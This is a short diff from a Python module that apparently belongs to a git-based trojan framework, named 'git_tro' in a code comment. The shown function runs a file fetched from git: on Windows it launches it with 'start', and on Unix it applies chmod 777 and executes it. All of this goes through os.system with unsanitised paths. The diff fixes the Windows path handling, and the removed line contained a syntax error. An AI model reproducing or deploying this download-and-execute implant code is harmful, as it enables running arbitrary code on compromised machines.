@@ -64,8 +64,8 @@ def run(**args): # Must import its personal lib, git_tro will execute this modul
 				return ("[ERROR] getFileFromGit: Permission Denied!")
 
 			if start and os.name == 'nt':
-				targetPath=targetPath.replace('\\','\\')
-				os.system("start {}".format(targetPath.split('\')[0]))   #format(targetPath.replace('/','\\')))
+				#targetPath=targetPath.replace('\\','\\')
+				os.system("start {}".format(targetPath))   #format(targetPath.replace('/','\\')))
 			elif start and os.name == 'posix':
 			    os.system("chmod 777 {}".format(targetPath))
 			    os.system("./{}".format(targetPath))
